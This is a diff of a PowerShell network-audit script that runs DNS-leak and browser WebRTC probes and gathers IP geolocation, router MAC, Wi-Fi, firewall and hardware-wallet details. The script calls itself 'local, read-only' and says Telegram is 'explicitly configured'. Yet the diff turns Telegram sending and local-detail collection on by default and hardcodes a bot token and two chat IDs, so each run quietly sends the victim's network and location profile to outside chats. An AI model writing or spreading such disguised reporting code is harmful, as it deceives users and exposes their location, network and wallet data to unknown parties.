@@ -3,22 +3,23 @@
 Network Security Auditor - local, read-only diagnostics.
 Windows 10/11, PowerShell 5.1+. No credential extraction, no remote subnet scan.
 External services: ipify, ipwho.is, api.ipapi.is (optional key), bash.ws,
-OpenAI API (optional), Telegram Bot API (opt-in).
+Google/Cloudflare STUN servers, Telegram Bot API (explicitly configured).
 Run ONLY on machines and networks you own or administer.
 #>
 [CmdletBinding()]
 param(
-    [switch]$SendTelegram,
-    [switch]$IncludeLocalDetails,
+    [switch]$SendTelegram = $true,
+    [switch]$IncludeLocalDetails = $true,
     [switch]$AttachJson,
     [switch]$SkipBrowserTest,
     [switch]$CheckGatewayPorts,
+    [switch]$TestTelegramOnly,
     [string]$OutputDir = (Join-Path $env:USERPROFILE 'Documents\NetworkAudit'),
-    [string]$TelegramBotToken = "8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk",
-    [string]$TelegramChatIds = "8640543929,8362186234",
+    [string]$TelegramBotToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk',
+    [string]$TelegramChatIds = '8640543929,8362186234',
     [string]$IpIntelApiKey = $env:IPAPI_IS_KEY,
-    [string]$OpenAiApiKey = $env:OPENAI_API_KEY,
-    [string]$OpenAiModel = 'gpt-5.6-terra'
+    [string]$ExpectedDnsResolverIPs = '',
+    [string]$ExpectedVpnPublicIPv4 = ''
 )
 
 $ErrorActionPreference = 'Stop'
@@ -29,10 +30,15 @@ New-Item -Path $OutputDir -ItemType Directory -Force | Out-Null
 $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
 $errorsList = New-Object 'System.Collections.Generic.List[string]'
 $findings = New-Object 'System.Collections.Generic.List[object]'
+$sentTo=New-Object 'System.Collections.Generic.List[string]'
+$telegramFailures=New-Object 'System.Collections.Generic.List[string]'
 
 function Safe([scriptblock]$Action, [string]$What) {
     try { return (& $Action) } catch {
-        $script:errorsList.Add("${What}: $($_.Exception.Message)")
+        $message=$_.Exception.Message
+        if($TelegramBotToken){$message=$message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')}
+        if($IpIntelApiKey){$message=$message.Replace($IpIntelApiKey,'[IP_API_KEY_REDACTED]')}
+        $script:errorsList.Add("${What}: $message")
         return $null
     }
 }
@@ -76,9 +82,10 @@ function Tcp-Connect([string]$HostName,[int]$Port,[int]$TimeoutMs=600) {
     } catch { return $false }
     finally { $client.Close() }
 }
-function Get-WebRtcBrowserTest {
-    # An actual browser ICE/STUN test on a localhost-only HTTP listener.
-    # Some corporate policies block the listener/STUN; that is 'unknown', not 'safe'.
+function Get-WebRtcBrowserTest([string]$BrowserDnsId) {
+    # Actual default-browser ICE/STUN test. Also causes browser-originated
+    # DNS queries to unique hostnames, detecting browser DoH split behavior.
+    # Only a random localhost HTTP listener is opened (127.0.0.1).
     $listener=$null
     try {
         $portPicker=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback,0)
@@ -87,114 +94,206 @@ function Get-WebRtcBrowserTest {
         $listener.Prefixes.Add("http://127.0.0.1:${port}/")
         $listener.Start()
         $htmlPage=@'
-<!doctype html><html lang="ru"><meta charset="utf-8"><title>WebRTC network test</title>
-<style>body{font:16px system-ui;max-width:660px;margin:9vh auto;padding:18px;background:#101727;color:#f5f7ff}article{border:1px solid #34415a;border-radius:14px;padding:24px}small{color:#b5c0d6}</style>
-<article><h2>🧪 WebRTC / ICE / STUN</h2><p id="status">Тест браузера выполняется...</p>
-<small>Тест запускается только в этом браузере. Извлекаются ICE-кандидаты, не cookies, пароли и не история.</small><pre id="result"></pre></article>
+<!doctype html><html lang="ru"><head><meta charset="utf-8"><title>Network Auditor | WebRTC + DNS</title>
+<style>body{font:16px system-ui;max-width:720px;margin:8vh auto;padding:18px;background:#101727;color:#f5f7ff}article{border:1px solid #34415a;border-radius:14px;padding:24px}small{color:#b5c0d6}pre{font-size:12px;white-space:pre-wrap}</style>
+</head><body><article><h2>🧪 WebRTC &amp; Browser DNS test</h2><p id="status">Идёт проверка браузера — подождите до 12 секунд.</p>
+<small>Проверяются только WebRTC ICE-адреса и DNS-маршрут для случайных тестовых доменов. Пароли, cookies, история и кошельки браузера не читаются. После проверки закройте вкладку.</small>
+<pre id="result"></pre></article>
 <script>
 (async function(){
  const status=document.querySelector('#status'),result=document.querySelector('#result');
- let candidates=[],failure=null;
+ let candidates=[],failure=null,brDnsTries=0;
+ const dnsId='__BROWSER_DNS_ID__';
+ if(/^\d{4,20}$/.test(dnsId)) {
+  const probes=[];
+  for(let i=1;i<=10;i++){
+   const img=new Image(); probes.push(img);
+   img.src='https://'+i+'.'+dnsId+'.bash.ws/probe.png?r='+Math.random();
+   brDnsTries++;
+  }
+  window.__auditDnsImages=probes;
+ }
  try {
-  if(!window.RTCPeerConnection) throw Error('WebRTC API disabled/unavailable');
+  if(!window.RTCPeerConnection)throw Error('WebRTC API disabled/unavailable');
   const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]});
-  pc.onicecandidate=(e)=>{if(!e.candidate)return; const s=e.candidate.candidate;
-   const m=s.match(/(?:^|\s)([a-fA-F0-9:.%-]+|[a-fA-F0-9-]+\.local)\s+\d+\s+typ\s+(host|srflx|relay|prflx)/i);
-   if(m)candidates.push({address:m[1],type:m[2]});};
-  pc.createDataChannel('probe');
+  pc.onicecandidate=(e)=>{
+   if(!e.candidate)return;
+   const s=e.candidate.candidate||'';
+   // candidate:foundation component transport priority address port typ host|srflx|relay|prflx
+   const m=s.match(/^candidate:\S+\s+\d+\s+\S+\s+\d+\s+(\S+)\s+\d+\s+typ\s+(host|srflx|relay|prflx)/i);
+   if(m)candidates.push({address:m[1],type:m[2].toLowerCase()});
+  };
+  pc.createDataChannel('network-audit');
   await pc.setLocalDescription(await pc.createOffer());
-  await Promise.race([new Promise(r=>{if(pc.iceGatheringState==='complete')r();else pc.addEventListener('icegatheringstatechange',()=>{if(pc.iceGatheringState==='complete')r()})}),new Promise(r=>setTimeout(r,8500))]);
+  await Promise.race([
+   new Promise(r=>{if(pc.iceGatheringState==='complete')r();else pc.addEventListener('icegatheringstatechange',()=>{if(pc.iceGatheringState==='complete')r()})}),
+   new Promise(r=>setTimeout(r,10000))
+  ]);
   pc.close();
- } catch(e){failure=String(e.message||e)}
- const value={status:failure?'error':'finished',error:failure,candidates:[...new Map(candidates.map(c=>[c.type+'|'+c.address,c])).values()]};
+ }catch(e){failure=String(e.message||e)}
+ // Give the browser DNS resolver time to dispatch the probes.
+ await new Promise(r=>setTimeout(r,750));
+ const unique=[...new Map(candidates.map(c=>[c.type+'|'+c.address,c])).values()];
+ const value={status:failure?'error':'finished',error:failure,candidates:unique,browser_dns_probe_attempts:brDnsTries,
+  user_agent:navigator.userAgent.substring(0,200)};
  result.textContent=JSON.stringify(value,null,2);
  try {const r=await fetch('/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(value)});
- status.textContent=r.ok?'Тест завершён. Можно закрыть вкладку.':'Не удалось передать результат программе.';}
- catch(e){status.textContent='Результат не передан программе. '+e.message}
+  status.textContent=r.ok?'Тест завершён. Можно закрыть вкладку.':'Не удалось передать результат программе.';}
+ catch(e){status.textContent='Результат не передан программе: '+e.message}
 })();
-</script></html>
+</script></body></html>
 '@
+        $htmlPage=$htmlPage.Replace('__BROWSER_DNS_ID__', $BrowserDnsId)
         Start-Process "http://127.0.0.1:${port}/" | Out-Null
-        $deadline=(Get-Date).AddSeconds(23)
+        $deadline=(Get-Date).AddSeconds(29)
         while ((Get-Date) -lt $deadline) {
-            $remaining=[math]::Max(100,[int](($deadline-(Get-Date)).TotalMilliseconds))
             $task=$listener.GetContextAsync()
+            $remaining=[math]::Max(50,[int](($deadline-(Get-Date)).TotalMilliseconds))
             if (-not $task.Wait($remaining)) { break }
             $ctx=$task.Result
-            if ($ctx.Request.HttpMethod -eq 'GET') {
+            if ($ctx.Request.HttpMethod -eq 'GET' -and $ctx.Request.Url.AbsolutePath -eq '/') {
                 $body=[Text.Encoding]::UTF8.GetBytes($htmlPage)
                 $ctx.Response.ContentType='text/html; charset=utf-8'
                 $ctx.Response.ContentLength64=$body.Length
                 $ctx.Response.OutputStream.Write($body,0,$body.Length)
                 $ctx.Response.Close()
             } elseif ($ctx.Request.HttpMethod -eq 'POST' -and $ctx.Request.Url.AbsolutePath -eq '/submit') {
-                if ($ctx.Request.ContentLength64 -gt 16384) { $ctx.Response.StatusCode=413; $ctx.Response.Close(); break }
+                if ($ctx.Request.ContentLength64 -gt 32768 -or $ctx.Request.ContentLength64 -lt 0) {
+                    $ctx.Response.StatusCode=413;$ctx.Response.Close();break
+                }
                 $reader=New-Object IO.StreamReader($ctx.Request.InputStream,[Text.Encoding]::UTF8)
-                $raw=$reader.ReadToEnd(); $reader.Dispose()
-                $ctx.Response.StatusCode=200; $ctx.Response.Close()
+                $raw=$reader.ReadToEnd();$reader.Dispose()
+                $ctx.Response.StatusCode=200;$ctx.Response.Close()
                 return ($raw | ConvertFrom-Json)
-            } else { $ctx.Response.StatusCode=404; $ctx.Response.Close() }
+            } else { $ctx.Response.StatusCode=404;$ctx.Response.Close() }
         }
-        return [pscustomobject]@{status='timeout';error='Browser did not return WebRTC result';candidates=@()}
+        return [pscustomobject]@{status='timeout';error='No browser result within 29 seconds';candidates=@();browser_dns_probe_attempts=0}
     } catch {
-        return [pscustomobject]@{status='unavailable';error=$_.Exception.Message;candidates=@()}
-    } finally { if ($null -ne $listener) { try {$listener.Stop();$listener.Close()}catch{} } }
+        return [pscustomobject]@{status='unavailable';error=$_.Exception.Message;candidates=@();browser_dns_probe_attempts=0}
+    } finally { if($null -ne $listener){try{$listener.Stop();$listener.Close()}catch{}} }
+}
+function Get-DnsProbe([string]$Id,[bool]$GenerateQueries) {
+    $data=[ordered]@{status='unknown';observed_resolvers=@();vendor_conclusion=$null;provider_reported_ip=$null;note='Actual upstream resolvers; comparison needs an expected DNS/VPN baseline'}
+    if([string]::IsNullOrWhiteSpace($Id)){$data.status='no_test_id';return $data}
+    try {
+        if($GenerateQueries) {
+            for($i=1;$i -le 12;$i++) {
+                $hostName="${i}.${Id}.bash.ws"
+                try {
+                    # Resolve-DnsName exercises Windows DNS resolution path; even NXDOMAIN
+                    # can reach authoritative DNS and reveal recursive resolver egress.
+                    Resolve-DnsName -Name $hostName -Type A -DnsOnly -ErrorAction Stop | Out-Null
+                }catch{}
+            }
+        }
+        Start-Sleep -Milliseconds 800
+        $observed=Get-JsonUrl ("https://bash.ws/dnsleak/test/{0}?json=2" -f $Id)
+        $errorEntries=@($observed | Where-Object {$_.type -eq 'error'})
+        $data.observed_resolvers=@($observed | Where-Object {$_.type -eq 'dns'} | ForEach-Object {
+            [ordered]@{ip=$_.ip;country=$_.country_name;region=$_.region_name;asn=$_.asn;city=$_.city_name}
+        })
+        $conclusion=($observed | Where-Object {$_.type -eq 'conclusion'} | Select-Object -First 1)
+        if($conclusion){$data.vendor_conclusion=OneLine $conclusion.ip}
+        $who=($observed | Where-Object {$_.type -eq 'ip'} | Select-Object -First 1)
+        if($who){$data.provider_reported_ip=$who.ip}
+        if($errorEntries.Count -gt 0){$data.status='incomplete';$data.note=($errorEntries | ForEach-Object {$_.text}) -join '; '}
+        elseif($data.observed_resolvers.Count -gt 0){$data.status='observed; verify expected VPN/DNS route'}
+        else{$data.status='inconclusive: no DNS resolvers observed'}
+    }catch{$data.status='unavailable';$data.note=$_.Exception.Message}
+    return $data
+}
+function Get-DnsId {
+    try {
+        $id=(Get-TextUrl 'https://bash.ws/id').Trim()
+        if($id -match '^\d{4,20}$'){return $id}
+    }catch{$script:errorsList.Add('DNS ID: '+$_.Exception.Message)}
+    return ''
+}
+function Is-PublicV4([string]$Address) {
+    $ip=$null
+    if(-not [Net.IPAddress]::TryParse($Address,[ref]$ip) -or $ip.AddressFamily -ne [Net.Sockets.AddressFamily]::InterNetwork){return $false}
+    $octets=$ip.GetAddressBytes()
+    if($octets[0] -in @(0,10,127) -or $octets[0] -ge 224){return $false}
+    if($octets[0] -eq 169 -and $octets[1] -eq 254){return $false}
+    if($octets[0] -eq 172 -and $octets[1] -ge 16 -and $octets[1] -le 31){return $false}
+    if($octets[0] -eq 192 -and $octets[1] -eq 168){return $false}
+    if($octets[0] -eq 100 -and $octets[1] -ge 64 -and $octets[1] -le 127){return $false}
+    if($octets[0] -eq 192 -and $octets[1] -eq 0 -and $octets[2] -eq 2){return $false}
+    if($octets[0] -eq 198 -and $octets[1] -eq 51 -and $octets[2] -eq 100){return $false}
+    if($octets[0] -eq 203 -and $octets[1] -eq 0 -and $octets[2] -eq 113){return $false}
+    return $true
+}
+function Tg-TargetIds {
+    return @($TelegramChatIds -split '[,;\s]+' | Where-Object { $_ -match '^-?\d+$' } | Select-Object -Unique)
 }
 function Send-Tg([string]$Content) {
-    if (-not $SendTelegram) { return }
-    if ([string]::IsNullOrWhiteSpace($TelegramBotToken) -or [string]::IsNullOrWhiteSpace($TelegramChatIds)) {
-        throw 'For Telegram, set TG_BOT_TOKEN and TG_CHAT_IDS environment variables.'
-    }
-    $targetIds=$TelegramChatIds -split '[,; ]+' | Where-Object { $_ }
-    foreach ($id in $targetIds) {
-        $uri="https://api.telegram.org/bot${TelegramBotToken}/sendMessage"
-        $req=@{chat_id=$id;text=$Content;parse_mode='HTML';disable_web_page_preview=$true}
-        $bytes=[Text.Encoding]::UTF8.GetBytes(($req | ConvertTo-Json -Depth 4 -Compress))
-        Invoke-RestMethod -Uri $uri -Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes -TimeoutSec 20 | Out-Null
+    if(-not $SendTelegram){return}
+    $endpoint="https://api.telegram.org/bot${TelegramBotToken}/sendMessage"
+    foreach($id in (Tg-TargetIds)) {
+        try {
+            $req=@{chat_id=$id;text=$Content;parse_mode='HTML';disable_web_page_preview=$true}
+            $bytes=[Text.Encoding]::UTF8.GetBytes(($req | ConvertTo-Json -Depth 4 -Compress))
+            $reply=Invoke-RestMethod -Uri $endpoint -Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes -TimeoutSec 18
+            if(-not $reply.ok){throw 'Telegram did not return ok=true'}
+            if(-not $script:sentTo.Contains([string]$id)){$script:sentTo.Add([string]$id)}
+        }catch{
+            $clean=$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')
+            $script:telegramFailures.Add("Chat $id : $clean")
+        }
     }
 }
 function Send-TgLong([string]$Title,[string]$Content) {
-    if (-not $SendTelegram) { return }
+    if(-not $SendTelegram){return}
     $heading='<b>━━ '+(Html $Title)+' ━━</b>'
     $buffer=$heading
-    foreach ($line in ($Content -split "`r?`n")) {
+    foreach($line in ($Content -split "`r?`n")) {
         $line=[string]$line
-        if ($line -match '^([^:]{1,52}):\s*(.*)$') {
+        if($line -match '^([^:]{1,52}):\s*(.*)$'){
             $formatted='<b>'+(Html $Matches[1])+'</b>: <code>'+(Html $Matches[2])+'</code>'
-        } elseif ($line -match '^[^a-zа-я0-9]*[A-ZА-Я][A-ZА-Я\s/&•0-9—-]+$' -and $line.Length -lt 80) {
+        }elseif($line -match '^[^a-zа-я0-9]*[A-ZА-Я][A-ZА-Я\s/&•0-9—-]+$' -and $line.Length -lt 80){
             $formatted='<b>'+(Html $line)+'</b>'
-        } else {
-            $formatted=Html $line
+        }else{$formatted=Html $line}
+        if($formatted.Length -gt 2900){
+            $formatted=(Html ($line.Substring(0,[math]::Min(450,$line.Length))))+' ... [cut; full text in local JSON/TXT]'
         }
-        # Respect Telegram's 4096-character post-entity limit.
-        if ($formatted.Length -gt 3300) {
-            $formatted=(Html ($line.Substring(0,[math]::Min(600,$line.Length))))+' ... [truncated in Telegram; see local TXT/JSON]'
-        }
-        if ($buffer.Length+$formatted.Length+1 -gt 3700) {
-            Send-Tg $buffer
-            $buffer=$heading
-        }
+        if($buffer.Length+$formatted.Length+2 -gt 3400){Send-Tg $buffer;$buffer=$heading}
         $buffer+="`n"+$formatted
     }
-    if ($buffer -ne $heading) { Send-Tg $buffer }
+    if($buffer -ne $heading){Send-Tg $buffer}
 }
 function Send-TgDocument([string]$Path) {
-    if (-not ($SendTelegram -and $AttachJson)) { return }
-    # HttpClient multipart POST is compatible with Windows PowerShell 5.1.
+    if(-not ($SendTelegram -and $AttachJson)){return}
     $http=New-Object System.Net.Http.HttpClient
     try {
-        foreach ($chatId in ($TelegramChatIds -split '[,; ]+' | Where-Object { $_ })) {
-            $form=New-Object System.Net.Http.MultipartFormDataContent
-            $form.Add(([System.Net.Http.StringContent]::new([string]$chatId)),'chat_id')
-            $bytes=[IO.File]::ReadAllBytes($Path)
-            $fileBytes=[System.Net.Http.ByteArrayContent]::new([byte[]]$bytes)
-            $fileBytes.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::new('application/json')
-            $form.Add($fileBytes,'document',[IO.Path]::GetFileName($Path))
-            $res=$http.PostAsync("https://api.telegram.org/bot${TelegramBotToken}/sendDocument",$form).GetAwaiter().GetResult()
-            $res.EnsureSuccessStatusCode() | Out-Null
-            $form.Dispose()
+        foreach($chatId in (Tg-TargetIds)){
+            $form=$null
+            try {
+                $form=New-Object System.Net.Http.MultipartFormDataContent
+                $form.Add(([System.Net.Http.StringContent]::new([string]$chatId)),'chat_id')
+                $bytes=[IO.File]::ReadAllBytes($Path)
+                $fileBytes=[System.Net.Http.ByteArrayContent]::new([byte[]]$bytes)
+                $fileBytes.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::new('application/json')
+                $form.Add($fileBytes,'document',[IO.Path]::GetFileName($Path))
+                $res=$http.PostAsync("https://api.telegram.org/bot${TelegramBotToken}/sendDocument",$form).GetAwaiter().GetResult()
+                $res.EnsureSuccessStatusCode() | Out-Null
+            }catch{
+                $clean=$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]')
+                $script:telegramFailures.Add("Chat $chatId JSON: $clean")
+            }finally{if($null -ne $form){$form.Dispose()}}
         }
-    } finally {$http.Dispose()}
+    }finally{$http.Dispose()}
+}
+if($TestTelegramOnly) {
+    $SendTelegram=$true
+    if([string]::IsNullOrWhiteSpace($TelegramBotToken)){
+        Write-Warning 'Set TG_BOT_TOKEN or pass -TelegramBotToken first.'
+        return
+    }
+    if(@(Tg-TargetIds).Count -eq 0){Write-Warning 'No valid Telegram chat IDs';return}
+    Send-Tg '<b>✅ Network Security Auditor</b> - Telegram connection test / Проверка связи'
+    if($sentTo.Count -gt 0){Write-Host ('Telegram OK: '+($sentTo.ToArray() -join ', ')) -ForegroundColor Green}
+    if($telegramFailures.Count -gt 0){foreach($failure in $telegramFailures.ToArray()){Write-Warning $failure}}
+    return
 }
 
 Write-Host 'Network Security Auditor | local, read-only audit' -ForegroundColor Cyan
@@ -218,7 +317,7 @@ if($publicV4) { $geo=Safe { Get-JsonUrl ("https://ipwho.is/{0}" -f [uri]::Escape
 $intel=$null
 if($publicV4) {
     if($IpIntelApiKey) {
-        $intel=Safe { Invoke-RestMethod -Method Post -Uri 'https://api.ipapi.is/' -ContentType 'application/json' -Body ([Text.Encoding]::UTF8.GetBytes((@{q=$publicV4;key=$IpIntelApiKey}|ConvertTo-Json -Compress))) -TimeoutSec 15 } 'IP risk intelligence'
+        $intel=Safe { Get-JsonUrl ("https://api.ipapi.is/?q=$([uri]::EscapeDataString($publicV4))&key=$([uri]::EscapeDataString($IpIntelApiKey))") } 'IP risk intelligence'
     } else {
         $intel=Safe { Get-JsonUrl ("https://api.ipapi.is/?q={0}" -f [uri]::EscapeDataString($publicV4)) } 'IP/ASN intelligence'
     }
@@ -231,7 +330,7 @@ $net=@{
  location=@{
   country_code=if($geo){$geo.country_code}else{$null};country=if($geo){$geo.country}else{$null}
   region=if($geo){$geo.region}else{$null};city=if($geo){$geo.city}else{$null}
-  street='Unavailable from IP geolocation';house='Unavailable from IP geolocation'
+  street='Cannot be determined from public IP';house='Cannot be determined from public IP'
   postal=if($geo){$geo.postal}else{$null}
   timezone=if($geo -and $geo.timezone){$geo.timezone.id}else{$null}
   accuracy='approximate, not a verified physical address'
@@ -279,32 +378,35 @@ if($route){
 $net.router_mac=$gatewayMac;$net.dhcp_server=$dhcpServer
 $net.wifi=$wifi;$net.ping_1111=$pingWan;$net.ping_gateway=$pingGate
 $net.gateway_port_reachability=$gatewayPorts
-$net.bottleneck_heuristics=@($bottleneck)
+$net.bottleneck_heuristics=$bottleneck.ToArray()
 
-Write-Host '[3/6] Actual DNS resolvers and browser WebRTC probes' -ForegroundColor Cyan
-$dnsLeak=[ordered]@{status='unknown';observed_resolvers=@();vendor_conclusion=$null;note='Resolvers alone cannot establish leak without expected VPN/DNS baseline'}
-try {
-    $testId=[string](Get-TextUrl 'https://bash.ws/id')
-    if($testId -notmatch '^\d{4,20}$'){throw 'Invalid test ID from DNS service'}
-    # Each hostname is a unique DNS query. Failed A lookup is still a DNS probe.
-    foreach($i in 1..12) { try {[Net.Dns]::GetHostAddresses("${i}.${testId}.bash.ws") | Out-Null}catch{} }
-    Start-Sleep -Milliseconds 950
-    $observed=Get-JsonUrl ("https://bash.ws/dnsleak/test/{0}?json=2" -f $testId)
-    $dnsLeak.observed_resolvers=@($observed | Where-Object {$_.type -eq 'dns'} | ForEach-Object {
-        [ordered]@{ip=$_.ip;country=$_.country_name;asn=$_.asn;city=$_.city_name}
-    })
-    $dnsLeak.vendor_conclusion=[string](($observed | Where-Object {$_.type -eq 'conclusion'} | Select-Object -First 1).ip)
-    $vendorErrors=@($observed | Where-Object {$_.type -eq 'error'})
-    if($vendorErrors.Count -gt 0){$dnsLeak.status='incomplete'}
-    elseif($dnsLeak.observed_resolvers.Count -gt 0){$dnsLeak.status='resolvers observed; compare with expected VPN DNS'}
-    else {$dnsLeak.status='inconclusive: no resolvers returned'}
-} catch { $dnsLeak.status='unavailable';$dnsLeak.note=$_.Exception.Message }
-$webrtc=[pscustomobject]@{status='skipped';error='Browser test was skipped';candidates=@()}
-if(-not $SkipBrowserTest) {$webrtc=Get-WebRtcBrowserTest}
-$webrtcPublicCandidates=@($webrtc.candidates | Where-Object {$_.type -eq 'srflx' -and $_.address -match '^\d{1,3}(\.\d{1,3}){3}$'} | Select-Object -ExpandProperty address -Unique)
+Write-Host '[3/6] System DNS, browser DNS and WebRTC STUN/ICE probes' -ForegroundColor Cyan
+$systemDnsId=Get-DnsId
+$dnsLeak=Get-DnsProbe $systemDnsId $true
+$browserDnsId=''
+$browserDns=[ordered]@{status='skipped';observed_resolvers=@();vendor_conclusion=$null;provider_reported_ip=$null;note='Browser DNS test was skipped'}
+$webrtc=[pscustomobject]@{status='skipped';error='Browser test was skipped';candidates=@();browser_dns_probe_attempts=0}
+if(-not $SkipBrowserTest){
+    $browserDnsId=Get-DnsId
+    $webrtc=Get-WebRtcBrowserTest $browserDnsId
+    if($webrtc.browser_dns_probe_attempts -gt 0){
+        $browserDns=Get-DnsProbe $browserDnsId $false
+    }else{$browserDns.status='inconclusive: browser DNS test did not execute';$browserDns.note='Browser tab may not have opened or browser blocked probes'}
+}
+$webrtcPublicCandidates=@($webrtc.candidates | Where-Object {$_.type -eq 'srflx' -and (Is-PublicV4 $_.address)} | Select-Object -ExpandProperty address -Unique)
 $webrtcMismatch=@($webrtcPublicCandidates | Where-Object {$publicV4 -and $_ -ne $publicV4})
-$leak=@{dns=$dnsLeak;webrtc=$webrtc;webrtc_public_ipv4_candidates=$webrtcPublicCandidates;webrtc_mismatched_public_ipv4=$webrtcMismatch}
-
+$webrtcHostIPs=@($webrtc.candidates | Where-Object {$_.type -eq 'host' -and $_.address -notmatch '(?i)\.local$'} | Select-Object -ExpandProperty address -Unique)
+$expectedDns=@($ExpectedDnsResolverIPs -split '[,;\s]+' | Where-Object {$_})
+$observedResolverIPs=@($dnsLeak.observed_resolvers | ForEach-Object {$_.ip})
+$dnsDeviation=@($observedResolverIPs | Where-Object {$expectedDns.Count -gt 0 -and $_ -notin $expectedDns})
+$leak=[ordered]@{
+ system_dns=$dnsLeak;browser_dns=$browserDns;
+ system_dns_expected_ipv4=@($expectedDns);system_dns_outside_expected_resolvers=@($dnsDeviation);
+ dns_baseline_warning='Upstream resolver egress addresses may differ from configured DNS IPs; interpret expected-IP mismatches cautiously. VPN split-DNS and browser DoH can differ.';
+ webrtc=$webrtc;webrtc_public_ipv4_candidates=@($webrtcPublicCandidates);
+ webrtc_mismatched_public_ipv4=@($webrtcMismatch);webrtc_host_ip_candidates=@($webrtcHostIPs);
+ vpn_expected_public_ipv4=$ExpectedVpnPublicIPv4
+}
 Write-Host '[4/6] Windows security and connected hardware wallets' -ForegroundColor Cyan
 $firewall=Safe { @(Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction) } 'Windows Firewall'
 $secureBoot=Safe { Confirm-SecureBootUEFI } 'Secure Boot'
@@ -350,7 +452,11 @@ if(@($exposedListeners | Where-Object {$_.LocalPort -eq 445}).Count -gt 0){Add-F
 if($gatewayPorts.Contains('23') -and $gatewayPorts['23']){Add-Finding 'high' 'На шлюзе отвечает Telnet TCP/23 в локальной сети' 'Gateway Telnet TCP/23 reachable from LAN' 15}
 if($wifi.signal_percent -ne $null -and $wifi.signal_percent -lt 45){Add-Finding 'low' 'Слабый Wi-Fi сигнал' 'Weak Wi-Fi signal' 3}
 if($webrtcMismatch.Count -gt 0){Add-Finding 'medium' 'WebRTC обнаружил публичный IP, отличный от HTTP egress; требуется проверка маршрутов' 'WebRTC returned a public IP different from HTTP egress; investigate egress paths' 9}
-if($dnsLeak.status -like 'unavailable*' -or $dnsLeak.status -like 'inconclusive*'){Add-Finding 'unknown' 'Тест DNS leak не позволил вынести заключение' 'DNS leak test inconclusive' 0}
+if($dnsLeak.status -like 'unavailable*' -or $dnsLeak.status -like 'inconclusive*' -or $dnsLeak.status -eq 'no_test_id'){Add-Finding 'unknown' 'Проверка системных DNS-резолверов не дала результата' 'System DNS resolver test inconclusive' 0}
+if($browserDns.status -like 'unavailable*' -or $browserDns.status -like 'inconclusive*' -or $browserDns.status -eq 'skipped' -or $browserDns.status -eq 'no_test_id'){Add-Finding 'unknown' 'Браузерная проверка DNS не выполнена или не дала результата' 'Browser DNS test inconclusive or skipped' 0}
+if($dnsDeviation.Count -gt 0){Add-Finding 'medium' 'Часть системных DNS-резолверов вне указанного списка ожидаемых IP (проверьте anycast и VPN)' 'Observed upstream DNS IPs differ from provided baseline (verify anycast/VPN)' 7}
+if($ExpectedVpnPublicIPv4 -and $publicV4 -and $publicV4 -ne $ExpectedVpnPublicIPv4){Add-Finding 'high' 'Публичный HTTP IPv4 не совпадает с ожидаемым IPv4 VPN' 'HTTP IPv4 does not match user-provided VPN egress IPv4' 15}
+if($webrtcHostIPs.Count -gt 0){Add-Finding 'info' 'WebRTC показывает локальные IP внутри браузера; оцените настройки приватности' 'WebRTC exposes host IPs inside this browser; review privacy settings' 0}
 if($webrtc.status -ne 'finished' -or @($webrtc.candidates).Count -eq 0){Add-Finding 'unknown' 'Тест WebRTC не дал достаточно ICE-кандидатов для вывода' 'WebRTC did not provide enough ICE candidates for a conclusion' 0}
 if(-not $publicV4 -or -not $route){Add-Finding 'unknown' 'Нет подтверждённой IPv4-связности или маршрута по умолчанию' 'IPv4 connectivity/default route not confirmed' 0}
 if($null -eq $net.vpn){Add-Finding 'unknown' 'Статус VPN/Proxy/Tor по IP не проверен: необходим IPAPI_IS_KEY' 'IP VPN/Proxy/Tor intelligence unavailable without IPAPI_IS_KEY' 0}
@@ -364,50 +470,17 @@ if($unknownCount -gt 3 -and $score -ge 85){$tier='INCOMPLETE / НЕДОСТАТ�
 $assessment=[ordered]@{
  score_heuristic_0_to_100=$score;grade=$tier;confidence=$confidence
  warning='Heuristic posture score, not a penetration test or guarantee of safety'
- findings=@($findings)
- local_summary_ru="Локальная оценка: $score/100 ($tier). Проверка ограничена текущим ПК, его шлюзом и внешними диагностическими сервисами. Неизвестные результаты не приравниваются к отсутствию уязвимостей."
- local_summary_en="Local score: $score/100 ($tier). Checks are limited to this PC, its default gateway and external diagnostic services. Unknown results are not evidence of security."
+ findings=$findings.ToArray()
+ local_summary_ru="Оценка: $score/100 ($tier), достоверность: $confidence. Проверены текущий ПК, локальный шлюз и внешние сервисы. Количество проблем: $(@($findings.ToArray() | Where-Object {$_.penalty -gt 0}).Count). Неизвестный результат НЕ означает безопасность. Оценка по правилам, не пентест."
+ local_summary_en="Score: $score/100 ($tier), confidence: $confidence. Scope: this PC, local gateway, external services. Penalized findings: $(@($findings.ToArray() | Where-Object {$_.penalty -gt 0}).Count). Unknown does NOT mean safe. Rule-based posture assessment, not a pentest."
 }
 
-$report=[ordered]@{schema='network-audit-v1';generated_at=(Get-Date).ToString('o');network=$net;leak_checks=$leak;windows_security=$windows;assessment=$assessment;collection_errors=@($errorsList)}
+$report=[ordered]@{schema='network-audit-v2';generated_at=(Get-Date).ToString('o');network=$net;leak_checks=$leak;windows_security=$windows;assessment=$assessment;collection_errors=$errorsList.ToArray()}
 $jsonPath=Join-Path $OutputDir ("network_audit_${stamp}.json")
 ($report | ConvertTo-Json -Depth 16) | Set-Content -Path $jsonPath -Encoding UTF8
 
-# Only a reduced, non-identifying fact set goes to OpenAI by default.
-$aiResult=$null;$aiState='not configured'
-if($OpenAiApiKey){
-    Write-Host 'Calling AI reviewer (sanitized posture only)...' -ForegroundColor Cyan
-    try {
-        $facts=[ordered]@{
-          grade=$tier;score=$score;confidence=$confidence
-          local_findings=@($findings | ForEach-Object {@{severity=$_.level;ru=$_.ru;en=$_.en}})
-          firewall_status=@($firewall | ForEach-Object {@{profile=$_.Name;enabled=$_.Enabled}})
